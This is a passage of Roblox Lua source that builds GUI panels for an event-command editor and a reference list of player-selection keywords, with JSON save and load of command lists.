		{34,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={33},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{54,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Numbers",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
		{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{56,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={54},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any Number",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{57,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={56},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{58,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={57},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{59,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={54},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Number",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{60,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={54},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{61,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={60},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{35,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={30},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Match String",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{36,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={30},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{37,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={36},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{38,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="DelayEditor",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,24),Visible=false,ZIndex=10,}},
		{39,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Font=3,Name="Secs",Parent={38},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),Position=UDim2.new(0,60,0,2),Size=UDim2.new(1,-65,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{40,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Label",Parent={39},Position=UDim2.new(0,-55,0,0),Size=UDim2.new(1,0,1,0),Text="Delay (s):",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{41,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="EventTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
		{42,"TextButton",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="Expand",Parent={41},Size=UDim2.new(0,20,0,20),Text=">",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
		{43,"TextLabel",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="EventName",Parent={41},Position=UDim2.new(0,25,0,0),Size=UDim2.new(1,-25,0,20),Text="OnSpawn",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{44,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=0,BackgroundTransparency=1,ClipsDescendants=true,Name="Cmds",Parent={41},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
		{45,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Name="Add",Parent={44},Position=UDim2.new(0,0,1,-20),Size=UDim2.new(1,0,0,20),ZIndex=10,}},
		{46,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={45},PlaceholderColor3=Color3.new(0.7843137383461,0.7843137383461,0.7843137383461),PlaceholderText="Add new command",Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-10,1,0),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{47,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={44},Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
		{48,"UIListLayout",{Parent={47},SortOrder=2,}},
		{49,"Frame",{currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="CmdTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
		{50,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text="a\b\c\d",TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{51,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Delete",Parent={49},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="X",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
		{52,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Settings",Parent={49},Position=UDim2.new(1,-40,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
		{53,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://1204397029",Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
	})
	main.Name = randomString()
	local mainFrame = main:WaitForChild("Content")
	local eventList = mainFrame:WaitForChild("List")
	local eventListHolder = eventList:WaitForChild("Holder")
	local cmdTemplate = mainFrame:WaitForChild("CmdTemplate")
	local eventTemplate = mainFrame:WaitForChild("EventTemplate")
	local settingsFrame = mainFrame:WaitForChild("Settings"):WaitForChild("Slider")
	local settingsTemplates = mainFrame.Settings:WaitForChild("Templates")
	local settingsList = settingsFrame:WaitForChild("List"):WaitForChild("Holder")
	table.insert(shade2,main.TopBar) table.insert(shade1,mainFrame) table.insert(shade2,eventTemplate)
	table.insert(text1,eventTemplate.EventName) table.insert(shade1,eventTemplate.Cmds.Add) table.insert(shade1,cmdTemplate)
	table.insert(text1,cmdTemplate.TextBox) table.insert(shade2,cmdTemplate.Delete) table.insert(shade2,cmdTemplate.Settings)
	table.insert(scroll,mainFrame.List) table.insert(shade1,settingsFrame) table.insert(shade2,settingsFrame.Line)
	table.insert(shade2,settingsFrame.Close) table.insert(scroll,settingsFrame.List) table.insert(shade2,settingsTemplates.DelayEditor.Secs)
	table.insert(text1,settingsTemplates.DelayEditor.Secs) table.insert(text1,settingsTemplates.DelayEditor.Secs.Label) table.insert(text1,settingsTemplates.Players.Title)
	table.insert(shade3,settingsTemplates.Players.CustomButton) table.insert(shade2,settingsTemplates.Players.Custom) table.insert(text1,settingsTemplates.Players.Custom)
	table.insert(shade3,settingsTemplates.Players.Any.Button) table.insert(shade3,settingsTemplates.Players.Me.Button) table.insert(text1,settingsTemplates.Players.Any)
	table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Strings.Title) table.insert(text1,settingsTemplates.Strings.Any)
	table.insert(shade3,settingsTemplates.Strings.Any.Button) table.insert(shade3,settingsTemplates.Strings.CustomButton) table.insert(text1,settingsTemplates.Strings.Custom)
	table.insert(shade2,settingsTemplates.Strings.Custom)
	table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Numbers.Title) table.insert(text1,settingsTemplates.Numbers.Any)
	table.insert(shade3,settingsTemplates.Numbers.Any.Button) table.insert(shade3,settingsTemplates.Numbers.CustomButton) table.insert(text1,settingsTemplates.Numbers.Custom)
	table.insert(shade2,settingsTemplates.Numbers.Custom)

	local tween = game:GetService("TweenService")
	local tweenInf = TweenInfo.new(0.25,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)

	local currentlyEditingCmd = nil

	settingsFrame:WaitForChild("Close").MouseButton1Click:Connect(function()
		settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
	end)

	local function resizeList()
		local size = 0

		for i,v in pairs(eventListHolder:GetChildren()) do
			if v.Name == "EventTemplate" then
				size = size + 20
				if v.Expand.Text == "V" then
					size = size + 20*(1+(#events[v.EventName.Text].commands or 0))
				end
			end
		end

		tween:Create(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)}):Play()

		if size > eventList.AbsoluteSize.Y then
			eventListHolder.Size = UDim2.new(1,-8,1,0)
		else
			eventListHolder.Size = UDim2.new(1,0,1,0)
		end
	end

	local function resizeSettingsList()
		local size = 0

		for i,v in pairs(settingsList:GetChildren()) do
			if v:IsA("Frame") then
				size = size + v.AbsoluteSize.Y
			end
		end

		settingsList.Parent.CanvasSize = UDim2.new(0,0,0,size)

		if size > settingsList.Parent.AbsoluteSize.Y then
			settingsList.Size = UDim2.new(1,-8,1,0)
		else
			settingsList.Size = UDim2.new(1,0,1,0)
		end
	end

	local function setupCheckbox(button,callback)
		local enabled = button.On.BackgroundTransparency == 0

		local function update()
			button.On.BackgroundTransparency = (enabled and 0 or 1)
		end

		button.On.MouseButton1Click:Connect(function()
			enabled = not enabled
			update()
			if callback then callback(enabled) end
		end)

		return {
			Toggle = function(nocall) enabled = not enabled update() if not nocall and callback then callback(enabled) end end,
			Enable = function(nocall) if enabled then return end enabled = true update()if not nocall and callback then callback(enabled) end end,
			Disable = function(nocall) if not enabled then return end enabled = false update()if not nocall and callback then callback(enabled) end end,
			IsEnabled = function() return enabled end
		}
	end

	local function openSettingsEditor(event,cmd)
		currentlyEditingCmd = cmd

		for i,v in pairs(settingsList:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

		local delayEditor = settingsTemplates.DelayEditor:Clone()
		delayEditor.Secs.FocusLost:Connect(function()
			cmd[3] = tonumber(delayEditor.Secs.Text) or 0
			delayEditor.Secs.Text = cmd[3]
			if onEdited then onEdited() end
		end)
		delayEditor.Secs.Text = cmd[3]
		delayEditor.Visible = true
		table.insert(shade2,delayEditor.Secs)
		table.insert(text1,delayEditor.Secs)
		table.insert(text1,delayEditor.Secs.Label)
		delayEditor.Parent = settingsList

		for i,v in pairs(event.sets) do
			if v.Type == "Player" then
				local template = settingsTemplates.Players:Clone()
				template.Title.Text = v.Name or "Player"

				local me,any,custom

				me = setupCheckbox(template.Me.Button,function(on)
					if not on then return end
					any.Disable()
					custom.Disable()
					cmd[2][i] = 0
					if onEdited then onEdited() end
				end)

				any = setupCheckbox(template.Any.Button,function(on)
					if not on then return end
					me.Disable()
					custom.Disable()
					cmd[2][i] = 1
					if onEdited then onEdited() end
				end)

				local customTextBox = template.Custom
				custom = setupCheckbox(template.CustomButton,function(on)
					if not on then return end
					me.Disable()
					any.Disable()
					cmd[2][i] = customTextBox.Text
					if onEdited then onEdited() end
				end)

				ViewportTextBox.convert(customTextBox)
				customTextBox.FocusLost:Connect(function()
					if custom:IsEnabled() then
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end
				end)

				local cVal = cmd[2][i]
				if cVal == 0 then
					me:Enable()
				elseif cVal == 1 then
					any:Enable()
				else
					custom:Enable()
					customTextBox.Text = cVal
				end

				template.Visible = true
				table.insert(text1,template.Title)
				table.insert(shade3,template.CustomButton)
				table.insert(shade3,template.Any.Button)
				table.insert(shade3,template.Me.Button)
				table.insert(text1,template.Any)
				table.insert(text1,template.Me)
				template.Parent = settingsList
			elseif v.Type == "String" then
				local template = settingsTemplates.Strings:Clone()
				template.Title.Text = v.Name or "String"

				local any,custom

				any = setupCheckbox(template.Any.Button,function(on)
					if not on then return end
					custom.Disable()
					cmd[2][i] = 0
					if onEdited then onEdited() end
				end)

				local customTextBox = template.Custom
				custom = setupCheckbox(template.CustomButton,function(on)
					if not on then return end
					any.Disable()
					cmd[2][i] = customTextBox.Text
					if onEdited then onEdited() end
				end)

				ViewportTextBox.convert(customTextBox)
				customTextBox.FocusLost:Connect(function()
					if custom:IsEnabled() then
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end
				end)

				local cVal = cmd[2][i]
				if cVal == 0 then
					any:Enable()
				else
					custom:Enable()
					customTextBox.Text = cVal
				end

				template.Visible = true
				table.insert(text1,template.Title)
				table.insert(text1,template.Any)
				table.insert(shade3,template.Any.Button)
				table.insert(shade3,template.CustomButton)
				template.Parent = settingsList
			elseif v.Type == "Number" then
				local template = settingsTemplates.Numbers:Clone()
				template.Title.Text = v.Name or "Number"

				local any,custom

				any = setupCheckbox(template.Any.Button,function(on)
					if not on then return end
					custom.Disable()
					cmd[2][i] = 0
					if onEdited then onEdited() end
				end)

				local customTextBox = template.Custom
				custom = setupCheckbox(template.CustomButton,function(on)
					if not on then return end
					any.Disable()
					cmd[2][i] = customTextBox.Text
					if onEdited then onEdited() end
				end)

				ViewportTextBox.convert(customTextBox)
				customTextBox.FocusLost:Connect(function()
					cmd[2][i] = tonumber(customTextBox.Text) or 0
					customTextBox.Text = cmd[2][i]
					if custom:IsEnabled() then
						if onEdited then onEdited() end
					end
				end)

				local cVal = cmd[2][i]
				if cVal == 0 then
					any:Enable()
				else
					custom:Enable()
					customTextBox.Text = cVal
				end

				template.Visible = true
				table.insert(text1,template.Title)
				table.insert(text1,template.Any)
				table.insert(shade3,template.Any.Button)
				table.insert(shade3,template.CustomButton)
				template.Parent = settingsList
			end
		end
		resizeSettingsList()
		settingsFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
	end

	local function defaultSettings(ev)
		local res = {}

		for i,v in pairs(ev.sets) do
			if v.Type == "Player" then
				res[#res+1] = v.Default or 0
			elseif v.Type == "String" then
				res[#res+1] = v.Default or 0
			elseif v.Type == "Number" then
				res[#res+1] = v.Default or 0
			end
		end

		return res
	end

	local function refreshList()
		for i,v in pairs(eventListHolder:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

		for name,event in pairs(events) do
			local eventF = eventTemplate:Clone()
			eventF.EventName.Text = name
			eventF.Visible = true
			table.insert(shade2,eventF)
			table.insert(text1,eventF.EventName)
			table.insert(shade1,eventF.Cmds.Add)

			local expanded = false
			eventF.Expand.MouseButton1Down:Connect(function()
				expanded = not expanded
				eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
				eventF.Expand.Text = expanded and "V" or ">"
				resizeList()
			end)

			local function refreshCommands()
				for i,v in pairs(eventF.Cmds.Holder:GetChildren()) do
					if v.Name == "CmdTemplate" then
						v:Destroy()
					end
				end

				for i,cmd in pairs(event.commands) do
					local cmdF = cmdTemplate:Clone()
					local cmdTextBox = cmdF.TextBox
					ViewportTextBox.convert(cmdTextBox)
					cmdTextBox.Text = cmd[1]
					cmdF.Visible = true
					table.insert(shade1,cmdF)
					table.insert(shade2,cmdF.Delete)
					table.insert(shade2,cmdF.Settings)

					cmdTextBox.FocusLost:Connect(function()
						event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
						if onEdited then onEdited() end
					end)

					cmdF.Settings.MouseButton1Click:Connect(function()
						openSettingsEditor(event,cmd)
					end)

					cmdF.Delete.MouseButton1Click:Connect(function()
						table.remove(event.commands,i)
						refreshCommands()
						resizeList()

						if currentlyEditingCmd == cmd then
							settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
						end
						if onEdited then onEdited() end
					end)

					cmdF.Parent = eventF.Cmds.Holder
				end

				eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			end

			local newBox = eventF.Cmds.Add.TextBox
			ViewportTextBox.convert(newBox)
			newBox.FocusLost:Connect(function(enter)
				if enter then
					event.commands[#event.commands+1] = {newBox.Text,defaultSettings(event),0}
					newBox.Text = ""

					refreshCommands()
					resizeList()
					if onEdited then onEdited() end
				end
			end)

			--eventF:GetPropertyChangedSignal("AbsoluteSize"):Connect(resizeList)

			eventF.Parent = eventListHolder

			refreshCommands()
		end

		resizeList()
	end

	local function saveData()
		local result = {}
		for i,v in pairs(events) do
			result[i] = v.commands
		end
		return game:GetService("HttpService"):JSONEncode(result)
	end

	local function loadData(str)
		local data = game:GetService("HttpService"):JSONDecode(str)
		for i,v in pairs(data) do
			if events[i] then
				events[i].commands = v
			end
		end
	end

	local function addCmd(event,data)
		table.insert(events[event].commands,data)
	end

	local function setOnEdited(f)
		if type(f) == "function" then
			onEdited = f
		end
	end

	main.TopBar.Close.MouseButton1Click:Connect(function()
		main:TweenPosition(UDim2.new(0.5,-175,0,-500), "InOut", "Quart", 0.5, true, nil)
	end)
	dragGUI(main)
	main.Parent = PARENT

	return {
		RegisterEvent = registerEvent,
		FireEvent = fireEvent,
		Refresh = refreshList,
		SaveData = saveData,
		LoadData = loadData,
		AddCmd = addCmd,
		Frame = main,
		SetOnEdited = setOnEdited
	}
end)()

reference = (function()
	local main = create({
		{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="Main",Position=UDim2.new(0.5,-250,0,-500),Size=UDim2.new(0,500,0,20),ZIndex=10,}},
		{2,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
		{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Size=UDim2.new(1,0,0.94999998807907,0),Text="Reference",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
		{6,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,300),ZIndex=10,}},
		{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,1295),Name="List",Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",VerticalScrollBarInset=2,ZIndex=10,}},
		{8,"UIListLayout",{Parent={7},SortOrder=2,}},
		{9,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,411),ZIndex=10,}},
		{10,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={9},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Special Player Cases",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{11,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={9},Position=UDim2.new(0,8,0,25),Size=UDim2.new(1,-8,0,20),Text="These keywords can be used to quickly select groups of players in commands:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{12,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={9},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{13,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Cases",Parent={9},Position=UDim2.new(0,8,0,55),Size=UDim2.new(1,-16,0,342),ZIndex=10,}},
		{14,"UIListLayout",{Parent={13},SortOrder=2,}},
		{15,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={15},Size=UDim2.new(1,0,1,0),Text="all",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{17,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={15},Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{18,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{19,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={18},Size=UDim2.new(1,0,1,0),Text="others",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={18},Position=UDim2.new(0,37,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone except you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{21,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{22,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={21},Size=UDim2.new(1,0,1,0),Text="me",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{23,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={21},Position=UDim2.new(0,19,0,0),Size=UDim2.new(1,0,1,0),Text="- includes your player only",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{24,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{25,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={24},Size=UDim2.new(1,0,1,0),Text="#[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{26,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={24},Position=UDim2.new(0,59,0,0),Size=UDim2.new(1,0,1,0),Text="- gets a specified amount of random players",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{27,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{28,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={27},Size=UDim2.new(1,0,1,0),Text="random",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{29,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={27},Position=UDim2.new(0,44,0,0),Size=UDim2.new(1,0,1,0),Text="- affects a random player",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{30,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={30},Size=UDim2.new(1,0,1,0),Text="%[team name]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{32,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={30},Position=UDim2.new(0,78,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone on a given team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{33,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{34,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={33},Size=UDim2.new(1,0,1,0),Text="allies / team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
